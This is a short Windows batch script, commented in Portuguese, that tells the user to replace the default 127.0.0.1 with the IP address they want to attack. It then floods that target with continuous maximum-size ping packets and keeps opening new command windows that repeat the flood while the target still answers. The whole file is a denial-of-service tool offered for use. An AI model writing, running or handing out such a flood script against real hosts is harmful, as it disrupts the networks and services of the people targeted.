@echo off

@REM troque o indereço de ip para o ip que deseja atacar
set Target=127.0.0.1 

:loop
ping %Target% -l 65500 -n 1000 -t | findstr /C:"Reply from" > nul
if %errorlevel%==0 (
    start cmd /c "ping %Target% -l 65500 -n 1000 -t"
    goto loop
) else (
    taskkill /IM ping.exe /F
    cls
    exit
)
